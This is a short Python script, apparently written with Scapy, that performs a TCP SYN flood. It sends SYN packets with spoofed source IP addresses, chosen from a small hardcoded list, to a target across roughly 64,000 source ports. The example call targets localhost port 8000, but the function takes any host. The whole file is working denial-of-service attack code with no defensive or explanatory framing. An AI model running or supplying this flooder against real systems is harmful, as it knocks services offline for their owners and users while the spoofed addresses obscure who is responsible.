from scapy.all import *
import random

def synFlood(tgt, dport):
	srcList = ['1.2.3.4','10.32.78.121','9.90.12.3']
	for sPort in range(1024, 65535):
		index = random.randrange(3)
		ipLayer = IP(src = srcList[index], dst = tgt)
		tcpLayer = TCP(sport = sPort, dport = dport, flags = "S")
		packet = ipLayer / tcpLayer
		send(packet)

if __name__ == "__main__":
	synFlood("127.0.0.1", 8000)
